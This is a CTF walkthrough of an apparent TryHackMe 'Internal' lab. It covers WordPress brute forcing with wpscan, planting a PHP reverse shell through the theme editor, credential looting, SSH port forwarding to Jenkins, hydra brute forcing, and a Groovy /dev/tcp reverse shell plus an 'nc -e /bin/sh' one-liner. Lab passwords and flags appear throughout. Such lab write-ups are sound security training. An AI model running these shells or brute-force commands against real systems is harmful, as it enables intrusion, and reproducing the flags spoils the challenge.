#CTF 

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks. 

**Scope of Work**

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

- User.txt
- Root.txt  

Additionally, the client has provided the following scope allowances:

- Ensure that you modify your hosts file to reflect internal.thm
- Any tools or techniques are permitted in this engagement
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope

(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.

  

Note - this room can be completed without Metasploit

****Writeups will not be accepted for this room.****

## Recon

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=7/8%OT=22%CT=1%CU=34768%PV=Y%DS=2%DC=I%G=Y%TM=64A93BD4
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=106%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11N
OS:W7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3
OS:%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508
OS:NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R
OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=
OS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Gobuster 

```
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/blog                 (Status: 301) [Size: 311] [--> http://10.10.78.148/blog/]         
/index.html           (Status: 200) [Size: 10918]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.78.148/javascript/]   
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.78.148/phpmyadmin/]   
/server-status        (Status: 403) [Size: 277]
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.78.148/wordpress/]    
```

And also for the phpmyadmin
```
/templates        (Status: 403) [Size: 277]
/themes           (Status: 301) [Size: 324] [--http://10.10.78.148/phpmyadmin/themes/]  
/libraries        (Status: 403) [Size: 277]
/setup            (Status: 401) [Size: 459]
/sql              (Status: 301) [Size: 321] [--> http://10.10.78.148/phpmyadmin/sql/]  
/js               (Status: 301) [Size: 320] [--> http://10.10.78.148/phpmyadmin/js/]    
/locale           (Status: 301) [Size: 324][--> http://10.10.78.148/phpmyadmin/locale/] 
```

I navigate to the /phpmyadmin subdomain. I am presented with a login form and a language option. So I know I have to exploit phpmyadmin, but I need to find the version.
I notice the question mark and I press it. It opens a new tab `phpmyadmin/doc/html/index.html#`
And on top I see `phpMyAdmin 4.6.6 documentation` , so I know the version too.

## Attack

I try to navigate on different pages that I got from gobuster, but I was getting errors.
So I added internal.thm on the hosts file and after that I was able to find the pages.
Next I find this `http://internal.thm/blog/wp-login.php`, which is a similar to [CTF { Mr Robot }](https://github.com/BabisSt/my-ctfs/blob/main/CTF%20%7B%20Mr%20Robot%20%7D.md) log-in form. So I try some default combinations and I get the required error on username:admin
```
**Error**: The password you entered for the username **admin** is incorrect. [Lost your password?](http://internal.thm/blog/wp-login.php?action=lostpassword)
```

I tried hydra on that ,but couldn't find anything. So I investigated /wordpress subdomain. I couln't navigate to that.
I found this wpscan online and I used it like that
```
wpscan --url internal.thm/wordpress/ --passwords /usr/share/wordlists/rockyou.txt  --usernames admin --max-threads 50
```

And I got
```
[!] Valid Combinations Found:                                                           
Username: admin, Password: my2boys    
```

I login and get this
```
# Administration email verification

Please verify that the **administration email** for this website is still correct. [Why is this important? (opens in a new tab)](https://wordpress.org/support/article/settings-general-screen/#email-address)

Current administration email: **admin@internal.thm**

This email may be different from your personal email address.
```

I am in and I navigate to Appearance -> Theme Editor.
On the 404 Template I paste my reverse-shell code.
I open a netcat listener and then
I navigate to `http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php`
and catch the connection
Under /home I find aubreanna directory but I can't cd in it.

I look around and I find /etc/phpmyadmin folder
I take a look inside
```
drwxr-xr-x   3 root root     4096 Aug  3  2020 .
drwxr-xr-x 102 root root     4096 Aug  3  2020 ..
-rw-r--r--   1 root root     2110 Jul 10  2017 apache.conf
drwxr-xr-x   2 root root     4096 Jul 10  2017 conf.d
-rw-r-----   1 root www-data  527 Aug  3  2020 config-db.php
-rw-r--r--   1 root root      168 Jun 23  2016 config.footer.inc.php
-rw-r--r--   1 root root      168 Jun 23  2016 config.header.inc.php
-rw-r--r--   1 root root     6319 Jun 23  2016 config.inc.php
-rw-r-----   1 root www-data    8 Aug  3  2020 htpasswd.setup
-rw-r--r--   1 root root      646 Apr  7  2017 lighttpd.conf
-rw-r--r--   1 root root      198 Jun 23  2016 phpmyadmin.desktop
-rw-r--r--   1 root root      295 Jun 23  2016 phpmyadmin.service
```

config-db.php looks promising
```
<?php
##
## database access settings in php format
## automatically generated from /etc/dbconfig-common/phpmyadmin.conf
## by /usr/sbin/dbconfig-generate-include
##
## by default this file is managed via ucf, so you shouldn't have to
## worry about manual changes being silently discarded.  *however*,
## you'll probably also want to edit the configuration file mentioned
## above too.
##
$dbuser='phpmyadmin';
$dbpass='B2Ud4fEOZmVq';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';
```

I see the creds above and I try to use them on the /phpmyadmin , and I login!
There were a lot empty tables and I got stuck , so I had to look online for any clues
On my netcat terminal I continued to look around and I found /opt/wp-save.txt
```
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

So I have the creds for the aubreanna user. I su to it and find my first flag!
`THM{int3rna1_fl4g_1}`

## Priv Esc

I sudo -l but I cant run it. So I `find / -perm -u=s -type f 2>/dev/null`

```
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/bin/mount
/bin/umount
/bin/ping
/bin/fusermount
/bin/su
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/pkexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

I also found a jenkins.txt file
`Internal Jenkins service is running on 172.17.0.2:8080`

I can't access it directly from my browser so I found online something like this
`ssh -L 4444:172.17.0.2:8080 aubreanna@internal.thm`
Now if I type localhost:4444 on my browser I can access a Jenkins login page.

I don't have the creds to login, so I need to bruteforce it either with burpsuite or hydra. I will do it with hydra like that:

```
ydra -l admin -P /usr/share/wordlists/rockyou.txt -s 4444 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&form=%2F&Submit=Sign+in&Login=Login:Invalid username or password' 
```

- I am using admin as a default username and I am looking for the password. 
- -s 4444 because thats my localhost port
- I know its a http-post-form
- I get this `/j_acegi_security_check` from the captured burpsuite request
- I also get these from burpsuite `j_username=admin&j_password=ok&from=%2F&Submit=Sign+in`

And after some time I have the password : spongebob

I get in and try to find a project to run a reverse shell , but I cant find one.
So I navigate to
Jenkins -> Manage Jenkins -> Script Console
Here I can run my reverse shell.
I open a netcat listener and I try this oneliner for the shell
`nc -e /bin/sh [local ip] 1234`, but I get a lot of errors such as :

`at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:129)`
I see eclipse so I know its java, so I try this reverse shell instead: 

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/[local ip]/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

And it works!

I try to spawn a more stable shell with
`python -c 'import pty;pty.spawn("/bin/bash")'`
but I cant so I try this instead
`/bin/bash -i`

So now I have to find the flag so I try something like this
`find / -name flag 2> /dev/null`, or with user or something else but I get nothing
Instead I broaden my scope with
`find / -name *.txt`
There are a lot of results, but there is an interesting /opt/note.txt
```
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123

```

And there I have it!
I login and I take my flag `THM{d0ck3r_d3str0y3r}`
